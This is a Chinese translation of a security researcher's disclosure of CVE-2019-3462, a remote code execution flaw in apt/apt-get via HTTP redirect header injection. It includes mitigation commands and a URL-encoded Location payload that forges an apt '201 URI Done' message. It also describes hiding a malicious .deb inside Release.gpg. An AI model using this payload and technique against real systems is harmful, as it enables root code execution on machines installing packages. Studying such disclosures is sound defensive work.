**原文：[Remote Code Execution in apt/apt-get](https://justi.cz/security/2019/01/22/apt-rce.html)  
作者：Max Justicz  
译者：Nanako@知道创宇404实验室 **

TL,DR:  
我在apt中发现了一个漏洞，它允许网络中间人（或恶意包镜像）以root身份在安装软件包的机器上执行任意代码。该漏洞已在apt最新版本中被修复。如果您担心在更新过程中被利用，可以通过禁用http重定向来保护自己。为此，请运行：

    
    
    $ sudo apt update -o Acquire::http::AllowRedirect=false
    
    $ sudo apt upgrade -o Acquire::http::AllowRedirect=false

如果当前镜像包在默认情况下重定向（意味着出现该标志时无法更新apt），则需要选择其它镜像或直接下载程序包。[该链接可以找到有关Debian升级的具体说明。](https://lists.debian.org/debian-security-announce/2019/msg00010.html)[Ubuntu的声明可以在这里找到。](https://usn.ubuntu.com/3863-1/)

作为证明，我录制了一段攻击如下`Dockerfile`的视频：

    
    
    FROM debian:latest
    
    RUN apt-get update && apt-get install -y cowsay

## **背景**

在获取数据时，apt将各种不同的数据传输协议的工作进程分离。然后，父进程通过`stdin/stdout`与这些工作进程进行通信，
利用一个类似http的协议告诉他们要下载的内容并将它放到文件系统上。例如，在一台机器上运行 `apt install
cowsay`并用http请求下载相应包的时候，apt将提供`/usr/lib/apt/methods/http`目录，并返回`100
Capabilities`消息：

    
    
    100 Capabilities
    
    Version: 1.2
    
    Pipeline: true
    
    Send-Config: true

然后，父进程发送其配置并请求资源，如下所示：

    
    
    601 Configuration
    
    Config-Item: APT::Architecture=amd64
    
    Config-Item: APT::Build-Essential::=build-essential
    
    Config-Item: APT::Install-Recommends=1
    
    (...many more lines omitted...)
    
    600 URI Acquire
    
    URI: http://deb.debian.org/debian/pool/main/c/cowsay/cowsay_3.03+dfsg2-3_all.deb
    
    Filename: /var/cache/apt/archives/partial/cowsay_3.03+dfsg2-3_all.deb
    
    Expected-SHA256: 858d5116a60ba2acef9f30e08c057ab18b1bd6df5ca61c233b6b7492fbf6b831
    
    Expected-MD5Sum: 27967ddb76b2c394a0714480b7072ab3
    
    Expected-Checksum-FileSize: 20070

然后工作进程会像下方这样响应：

    
    
    102 Status
    
    URI: http://deb.debian.org/debian/pool/main/c/cowsay/cowsay_3.03+dfsg2-3_all.deb
    
    Message: Connecting to prod.debian.map.fastly.net
    
    102 Status
    
    URI: http://deb.debian.org/debian/pool/main/c/cowsay/cowsay_3.03+dfsg2-3_all.deb
    
    Message: Connecting to prod.debian.map.fastly.net (2a04:4e42:8::204)
    
    102 Status
    
    URI: http://deb.debian.org/debian/pool/main/c/cowsay/cowsay_3.03+dfsg2-3_all.deb
    
    Message: Waiting for headers
    
    200 URI Start
    
    URI: http://deb.debian.org/debian/pool/main/c/cowsay/cowsay_3.03+dfsg2-3_all.deb
    
    Size: 20070
    
    Last-Modified: Tue, 17 Jan 2017 18:05:21 +0000
    
    201 URI Done
    
    URI: http://deb.debian.org/debian/pool/main/c/cowsay/cowsay_3.03+dfsg2-3_all.deb
    
    Filename: /var/cache/apt/archives/partial/cowsay_3.03+dfsg2-3_all.deb
    
    Size: 20070
    
    Last-Modified: Tue, 17 Jan 2017 18:05:21 +0000
    
    MD5-Hash: 27967ddb76b2c394a0714480b7072ab3
    
    MD5Sum-Hash: 27967ddb76b2c394a0714480b7072ab3
    
    SHA256-Hash: 858d5116a60ba2acef9f30e08c057ab18b1bd6df5ca61c233b6b7492fbf6b831
    
    Checksum-FileSize-Hash: 20070

当http服务器根据重定向进行响应时，工作进程返回`103 Redirect`而非`201 URI Done`。父进程根据此响应来确定接下来应该请求的资源：

    
    
    103 Redirect
    
    URI: http://deb.debian.org/debian/pool/main/c/cowsay/cowsay_3.03+dfsg2-3_all.deb
    
    New-URI: http://example.com/new-uri

## **漏洞**

不幸的是，进行http下载的进程会对`HTTP Location`头进行url解码，并直接附加到`103 Redirect`响应中：

    
    
    // From methods/basehttp.cc
    NextURI = DeQuoteString(Req.Location);
    ...
    Redirect(NextURI);
    
    // From apt-pkg/acquire-method.cc
    void pkgAcqMethod::Redirect(const string &NewURI)
    {
       std::cout << "103 Redirect\nURI: " << Queue->Uri << "\n"
                 << "New-URI: " << NewURI << "\n"
                 << "\n" << std::flush;
       Dequeue();
    }

（注意：不同版本的apt之间存在重要差异。上述代码来自Debian最近使用的1.4.y版本。一些Ubuntu版本使用的是1.6.y，它不仅仅是直接附加URI。然而在后续的http提取程序发出的`600
URI Acquire`请求中仍然存在注入漏洞。其他版本我并没有做检查。）

因此，如果http服务器发送`Location: /new-uri%0AFoo%3A%20Bar`，http提取进程将回复以下内容：

    
    
    103 Redirect
    
    URI: http://deb.debian.org/debian/pool/main/c/cowsay/cowsay_3.03+dfsg2-3_all.deb
    
    New-URI: http://deb.debian.org/new-uri
    
    Foo: Bar

或者，如果http服务器发送：

    
    
    Location: /payload%0A%0A201%20URI%20Done%0AURI%3A%20http%3A//deb.debian.org/payload%0AFilename%3A%20/var/lib/apt/lists/deb.debian.org_debian_dists_stretch_Release.gpg%0ASize%3A%2020070%0ALast-Modified%3A%20Tue%2C%2007%20Mar%202017%2000%3A29%3A01%20%2B0000%0AMD5-Hash%3A%2027967ddb76b2c394a0714480b7072ab3%0AMD5Sum-Hash%3A%2027967ddb76b2c394a0714480b7072ab3%0ASHA256-Hash%3A%20858d5116a60ba2acef9f30e08c057ab18b1bd6df5ca61c233b6b7492fbf6b831%0AChecksum-FileSize-Hash%3A%2020070%0A

那么http提取进程会回复：

    
    
    103 Redirect
    
    URI: http://deb.debian.org/debian/pool/main/c/cowsay/cowsay_3.03+dfsg2-3_all.deb
    
    New-URI: http://deb.debian.org/payload
    
    201 URI Done
    
    URI: http://deb.debian.org/payload
    
    Filename: /var/lib/apt/lists/deb.debian.org_debian_dists_stretch_Release.gpg
    
    Size: 20070
    
    Last-Modified: Tue, 07 Mar 2017 00:29:01 +0000
    
    MD5-Hash: 27967ddb76b2c394a0714480b7072ab3
    
    MD5Sum-Hash: 27967ddb76b2c394a0714480b7072ab3
    
    SHA256-Hash: 858d5116a60ba2acef9f30e08c057ab18b1bd6df5ca61c233b6b7492fbf6b831
    
    Checksum-FileSize-Hash: 20070

## **注入恶意包**

因为我在我的验证程序中注入`201 URI
Done`响应，所以我不得不处理没有下载任何包的问题。我需要一种方法让恶意的.deb进入系统，以便在Filename参数中使用。

为了实现这点，我利用了`apt
update`时`release.gpg`文件可以被修改，并安装在可预测的位置这个特点。具体来说，`Release.gpg`包含的PGP签名，如下所示：

    
    
    -----BEGIN PGP SIGNATURE-----    
    ...
    
    -----END PGP SIGNATURE-----
只要注入的内容不接触到签名内容，apt的签名验证程序就不会报错，所以我拦截了`release.gpg`请求，并用我的恶意deb进行了预处理：

    
    
    <oops.deb contents>
    
    -----BEGIN PGP SIGNATURE-----    
    ...
    
    -----END PGP SIGNATURE-----
然后，我在`201 URI Done`响应中设置Filename参数：

    
    
    /var/lib/apt/lists/deb.debian.org_debian_dists_stretch_Release.gpg

## **http / https争议**

默认情况下，Debian和Ubuntu都使用开箱即用的http存储库（Debian允许您在安装过程中选择所需镜像，但实际上不支持https存储库 -您必须先安装`apt-transport-https`）。

如果程序包清单已签名，为什么还要使用https？毕竟，由于包的大小有限，隐私获益是最小的。而且使用https会使缓存受限。

也有对此很感兴趣的人。某些网站专门解释为什么在apt上下文中使用https没有意义。

这些都是很好的观点，但是我这篇文章中的bug是存在的。无独有偶——这是JannHorn在2016年发现的[另一个具有相同影响的bug](https://www.debian.org/security/2016/dsa-3733)。没错，即使使用的是https，恶意镜像依然可以利用这样的漏洞。但我觉得，与其攻击使用http或TLS证书的`deb.debian.org`，还不如直接攻击目标服务器上的应用服务。

（假设`apt-transport-https`本身没有灾难性的破坏。我并没有审计，但它看起来像是围绕libcurl的一个相对较薄的包装。）

支持http是个好事。我只是认为把https作为更安全的默认存储库是值得的，如果用户选择这样做的话，允许他们降低安全级别。如果服务器包默认使用的是https，我就无法利用本文顶部的dockerfile。

## **总结**

感谢apt维护者及时修补此漏洞，并感谢Debian安全团队协助披露。这个漏洞已经注册编号：CVE-2019-3462。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/799/>

